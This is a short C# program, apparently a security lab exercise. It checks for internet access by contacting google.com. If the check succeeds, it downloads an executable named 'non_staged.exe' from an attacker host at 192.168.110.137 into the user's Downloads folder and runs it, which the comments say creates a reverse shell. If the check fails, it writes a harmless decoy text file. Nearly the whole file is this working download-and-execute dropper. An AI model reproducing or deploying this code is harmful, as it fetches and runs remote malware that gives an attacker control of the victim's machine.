using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Lab02_CheckInternetConnection
{
    class Program
    {
        static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            if(CheckForInternetConnection())
            {
                // Create reverse shell to attcker
                CreateReverseShell();
            }
            else
            {
                // Create new file
                CreateNewFile();
            }
        }
        private static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        private static void CreateReverseShell()
        {
            var webClient = new WebClient();
            var path = @"C:\Users\grey\Downloads\shell_reverse.exe";
            // Download malicious file exe from attacker
            webClient.DownloadFile(new Uri("http://192.168.110.137/non_staged.exe"), path);
            // Execute the malicious file
            Process.Start(path);
        }
        private static void CreateNewFile()
        {
            string fileName = @"C:\Users\grey\Desktop\normal-file.txt";
            try
            {
                // Check if file already exists. If yes, delete it.     
                if (File.Exists(fileName))
                {
                    File.Delete(fileName);
                }

                // Create a new file     
                using (StreamWriter writer = File.CreateText(fileName))
                {
                    writer.WriteLine("This is a new file");
                    writer.WriteLine("18521550");
                }
            }
            catch (Exception Ex)
            {
                // Do something
            }
        }
    }
}
